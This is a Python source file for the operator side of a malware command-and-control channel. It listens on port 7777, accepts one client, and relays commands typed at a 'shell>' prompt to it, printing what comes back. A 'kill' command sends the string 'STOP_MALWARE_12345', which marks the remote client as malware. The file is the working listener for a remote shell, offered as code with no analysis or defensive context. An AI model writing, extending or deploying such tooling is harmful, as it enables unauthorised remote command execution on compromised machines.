import socket


def start_server():
    HOST = "0.0.0.0"
    PORT = 7777

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"[*] Server listening on {HOST}:{PORT}")
    print("[*] Waiting for client connection...")

    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")

    try:
        while True:
            command = input("shell> ")

            if command.lower() == 'exit':
                break

            if command.lower() == 'kill':
                # Send kill command
                client_socket.send(b"STOP_MALWARE_12345")
                print("kill command sent")
                break

            client_socket.send(command.encode())

            # Receive output
            output = client_socket.recv(65536).decode('utf-8', errors='ignore')
            print(output)

    except KeyboardInterrupt:
        print("\nserver stopped")
    except Exception as e:
        print(f"error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[server shutdown")


if __name__ == "__main__":
    start_server()